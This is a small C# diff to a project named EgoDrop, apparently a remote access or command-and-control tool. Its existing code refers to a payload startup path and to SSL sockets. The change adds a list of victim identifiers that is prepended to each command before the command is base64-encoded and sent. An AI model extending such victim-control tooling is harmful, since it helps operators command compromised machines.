@@ -27,6 +27,8 @@ namespace EgoDrop
             public string szFilePath;                         //Payload startup file path.
         }
 
+        public List<string> m_lsVictim;
+
         public Socket m_sktClnt           { get; set; }       //Socket object.
         public SslStream m_sslClnt        { get; set; }       //SSL object.
         public NetworkStream m_streamClnt { get; set; }       //Networkstream object.
@@ -156,6 +158,8 @@ namespace EgoDrop
         /// <param name="lsMsg"></param>
         public void fnSendCommand(List<string> lsMsg)
         {
+            m_lsVictim = m_lsVictim == null ? new List<string>() : m_lsVictim;
+            lsMsg = m_lsVictim.Concat(lsMsg).ToList();
             lsMsg = lsMsg.Select(x => clsEZData.fnStrE2B64(x)).ToList();
             string szMsg = string.Join("|", lsMsg);
             byte[] abBuffer = { };
